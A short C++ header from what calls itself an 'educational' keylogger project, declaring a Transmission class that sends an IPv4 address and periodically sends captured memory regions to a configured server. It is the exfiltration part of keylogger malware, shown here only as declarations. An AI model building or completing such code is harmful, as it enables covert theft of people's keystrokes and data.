/*
 * ObfuscatedKeylogger.cpp
 * Author: Alex Zevnoski (Leshenka)
 * Copyright (c) 2024 Alex Zevnoski (Leshenka)
 *
 * This file is part of the ObfuscatedKeylogger project, an educational
 * and experimental project demonstrating obfuscation and data transmission techniques.
 *
 * DISCLAIMER: This software is intended solely for educational purposes.
 * The author does not condone or support illegal or unethical use of this software.
 */

#ifndef TRANSMISSION_H
#define TRANSMISSION_H
#include "Keylogger.h"

class Transmission {
private:
    const std::string serverUrl = SERVER_URL;

public:
    int sendIpv4ToServer(const char* ipv4Address);
    void sendToServerPeriodically(MemoryRegion* memRegion);
};

#endif